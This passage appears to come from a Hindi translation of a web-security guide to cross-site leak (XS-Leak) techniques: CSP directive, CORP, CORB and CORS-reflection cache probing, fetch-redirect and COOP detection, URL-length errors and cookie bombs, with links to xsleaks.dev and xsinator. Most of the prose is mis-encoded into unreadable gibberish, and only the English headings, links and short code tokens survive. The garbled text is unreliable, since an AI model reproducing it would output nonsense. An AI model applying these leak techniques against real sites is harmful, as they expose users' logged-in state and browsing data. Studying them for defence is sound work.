рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╢рд╛рдпрдж рд╕рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдЭрд╛ рдХреИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрдирдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдпрд╣ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдиреЗ **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рд╣реЛ**ред

рдпрджрд┐ рдПрдХ рдкреГрд╖реНрда рдХреЗрд╡рд▓ рддрдм рддрдХ рдПрдХ рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк **рд╕рдВрд╕рд╛рдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рд╕рдВрд╕рд╛рдзрди** (рддрд╛рдХрд┐ рдпрджрд┐ рдерд╛ рддреЛ рдЕрдм рдирд╣реАрдВ рдХреИрд╢ рд╣реЛ), **рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░рджрд░реНрд╢рди** рдХрд░реЗрдВ рдЬреЛ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ **рдПрдХ рдмреБрд░рд╛ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ** (рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд▓рдВрдмрд╛ referer рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рдпрджрд┐ рд╕рдВрд╕рд╛рдзрди рдХрд╛ рд▓реЛрдб **рдХрд┐рд╕реА рднреА рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдХреИрд╢ рд╣реИ**ред

### CSP рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **рд╕рд╛рд░рд╛рдВрд╢:** CSP рд╣реЗрдбрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ CSP рдЖрдЗрдлреНрд░реЗрдо рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░реАрдХреНрд╖рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдиреАрддрд┐ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome (GC) рдореЗрдВ рдПрдХ рдирд╡реАрдирддрдо рд╕реБрд╡рд┐рдзрд╛ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ **рдПрдХ рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ (CSP) рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ** рдПрдХ рдЖрдЗрдлреНрд░реЗрдо рддрддреНрд╡ рдкрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗрдЯ рдХрд░рдХреЗ, рдЬрд┐рд╕рдореЗрдВ рдиреАрддрд┐ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рдкреНрд░рд╕рд╛рд░рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдпрдд: рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдПрдХ HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рдЕрдзрд┐рдХреГрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рдпрд╛ рдПрдХ **рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЖрдЗрдлреНрд░реЗрдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ CSP рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ рдирдИ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдиреАрддрд┐ рдЕрдзрд┐рдХ рд╕рдВрдХреЛрдЪрдХ рдирд╣реАрдВ рд╣реИ, рддреЛ рдкреГрд╖реНрда рд╕рд╛рдорд╛рдиреНрдпрдд: рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛ред рдпрд╣ рддрдВрддреНрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рдж рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рд░реНрдЧ рдЦреЛрд▓рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рдПрдХ рдкреГрд╖реНрда рдХреА **рдирд┐рд╢реНрдЪрд┐рдд CSP рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рд╡рд┐рдХрд▓реНрдкрд┐рддрддрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд╣рдорд╛рд░реЗ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕рд╛рдмрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдПрдХ **рдирдпрд╛ рд▓реАрдХ рддрдХрдиреАрдХ** рдЬреЛ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрдЭрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рдореМрд▓рд┐рдХ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдХрднреА рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдВрдмреЛрдзрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### **CORP**

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ рдПрдкреАрдЖрдИ
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **рд╕рд╛рд░рд╛рдВрд╢:** Cross-Origin Resource Policy (CORP) рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдЧрд╛ рдЬрдм рдЙрд╕реЗ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреАред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP рд╣реЗрдбрд░ рдПрдХ рдирдИ рд╡реЗрдм рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬрдм рд╕реЗрдЯ рд╣реЛрддреА рд╣реИ рддреЛ рд╡рд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП **рдХреЛрдИ-рдХреЛрд░реНрд╕ рдХреНрд░реЙрд╕-рд╕рдВрд╕рд╛рдзрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреА рд╣реИ**ред рд╣реЗрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдкрддрд╛ рд▓рдЧрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ CORP рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди **рдЬрдм рдлреЗрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдЧрд╛**ред
### CORB

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рд╣реЗрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **рд╕рд╛рд░рд╛рдВрд╢**: CORB рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрдм **`nosniff` рд╣реЗрдбрд░ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ** рдЕрдиреБрд░реЛрдз рдореЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

### рдореМрд▓рд┐рдХ рднреВрд▓ рдкрд░ CORS рддреНрд░реБрдЯрд┐ <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рд╣реЗрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **рд╕рд╛рд░рд╛рдВрд╢**: рдпрджрд┐ рдореВрд▓ рдорд╛рди `Access-Control-Allow-Origin` рдореЗрдВ рдореМрд▓рд┐рдХ рд╣реЗрдбрд░ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХреИрд╢ рдореЗрдВ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

рдпрджрд┐ **рдореВрд▓ рд╣реЗрдбрд░** рд╣реЗрдбрд░ `Access-Control-Allow-Origin` рдореЗрдВ **рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд** рд╣реЛ рд░рд╣рд╛ рд╣реИ рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **CORS** рдореЛрдб рдореЗрдВ **рд╕рдВрд╕рд╛рдзрди** рдХреЛ **рдкреНрд░рд╛рдкреНрдд** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХреЗред рдпрджрд┐ рдХреЛрдИ **рддреНрд░реБрдЯрд┐** **рдирд╣реАрдВ** рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ **рд╡реЗрдм рд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ рдерд╛**, рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ **рдЙрддреНрдкрдиреНрди** рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХрд┐ рдпрд╣ **рдХреИрд╢ рд╕реЗ рдПрдХреНрд╕реЗрд╕** рд╣реБрдЖ рдерд╛ (рддреНрд░реБрдЯрд┐ рдЗрд╕рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреИрд╢ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рд╣реЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ CORS рд╣реЗрдбрд░ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдореВрд▓ рдбреЛрдореЗрди рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдбреЛрдореЗрди рдХреЛ рдирд╣реАрдВ)**.**
**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдореВрд▓ рдирд╣реАрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (`Access-Control-Allow-Origin: *`) рддреЛ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред**

## Readable Attributes Technique

### Fetch Redirect

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЬреАрд╕реА рдФрд░ рдПрд╕рдП рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рдХрд╛рд░ (рдУрдкреЗрдХ-рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ) рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Fetch API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде `redirect: "manual"` рдФрд░ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, `response.type` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдкрдврд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдпрджрд┐ рдпрд╣ `opaqueredirect` рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ рддреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдереАред

### COOP

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдк
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдУрдкрдирд░ рдиреАрддрд┐ (COOP) рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЗрдВрдЯрд░реИрдХреНрд╢рди рд╕реЗ рдкрд╣реБрдВрдЪ рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдУрдкрдирд░ рдиреАрддрд┐ (COOP) рд╣реЗрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред COOP рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдмрд╛рд╣реНрдп рд╕рд╛рдЗрдЯреЗрдВ рд╡рд┐рдЪрд┐рддреНрд░ рд╡рд┐рдВрдбреЛ рд╕рдВрджрд░реНрдн рдкреНрд░рд╛рдкреНрдд рди рдХрд░ рд╕рдХреЗрдВред рдЗрд╕ рд╣реЗрдбрд░ рдХреА рджреГрд╢реНрдпрддрд╛ **`contentWindow` рд╕рдВрджрд░реНрдн** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдЬрдм COOP рд╢рд░реНрддрд╛рдиреБрд╕рд╛рд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ **`opener` рдЧреБрдгрдХ** рдПрдХ рдкрд╣рдЪрд╛рдирдХрд░ рдЗрдВрдбрд┐рдХреЗрдЯрд░ рдмрди рдЬрд╛рддрд╛ рд╣реИ: рдпрд╣ **рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рд╣реЛрддрд╛ рд╣реИ рдЬрдм COOP рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ, рдФрд░ **рдкрд░рд┐рднрд╛рд╖рд┐рдд** рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИред

### URL рдорд╛рдХреНрд╕ рд▓рдВрдмрд╛рдИ - рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреЗрдЪ рдПрдкреАрдЖрдИ, рдПрдЪрдЯреАрдПрдордПрд▓ рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб / рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЕрдВрддрд░реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓рдВрдмрд╛рдИ рдЕрдзрд┐рдХ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЛрд╣рд░рд╛рдП рдФрд░ рдПрдХ рдЪреЗрддрд╛рд╡рдиреА рдЙрддреНрдкрдиреНрди рд╣реЛред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

рдпрджрд┐ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдореЗрдВ **рдкреНрд░рдпреЛрдХреНрддрд╛ рдЗрдирдкреБрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдФрд░ **рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рддреЛ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдо рддреМрд░ рдкрд░ **рд╕рд░реНрд╡рд░реЛрдВ** рдХреЗ рдкрд╛рд╕ **рд╕реАрдорд╛ рдЕрдиреБрд░реЛрдз рд▓рдВрдмрд╛рдИ** рд╣реЛрддреА рд╣реИред рдпрджрд┐ **рдкреНрд░рдпреЛрдХреНрддрд╛ рдбреЗрдЯрд╛** рдЙрд╕ **рд▓рдВрдмрд╛рдИ - 1** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди** рдЙрд╕ **рдбреЗрдЯрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ **рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд** рдЬреЛрдбрд╝ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ **рддреНрд░реБрдЯрд┐ рдЬрд┐рд╕реЗ рддреНрд░реБрдЯрд┐ рдШрдЯрдирд╛рдПрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдкреНрд░рдпреЛрдХреНрддрд╛ рдХреЛ рдХреБрдХреА рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛ рдХреЛ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдкрд░реНрдпрд╛рдкреНрдд рдХреБрдХреА рд╕реЗрдЯ рдХрд░рдХреЗ** ([**рдХреБрдХреА рдмрдо**](../hacking-with-cookies/cookie-bomb.md)) рддрд╛рдХрд┐ **рд╕рд╣реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХрд╛ **рдЙрддреНрддрд░ рдмрдврд╝ рдЬрд╛рдП** рддреЛ рдПрдХ **рддреНрд░реБрдЯрд┐** рдЯреНрд░рд┐рдЧрд░ рд╣реЛред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдХ рд╣реА рд╕рд╛рдЗрдЯ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ, `<script>` рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреБрдХреАрдЬрд╝ рднреЗрдЬреЗрдЧрд╛ (рддрд╛рдХрд┐ рдЖрдк рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХреЗрдВ)ред\
рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрд╛ **рдХреБрдХреА рдмрдо + XS-Search** рдЗрд╕ рд▓реЗрдЦ рдХреЗ рдЗрдВрдЯреЗрдВрдбреЗрдб рд╕рдорд╛рдзрд╛рди рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` рдпрд╛ рдПрдХ рд╣реА рд╕рдВрджрд░реНрдн рдореЗрдВ рд╣реЛрдирд╛ рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред

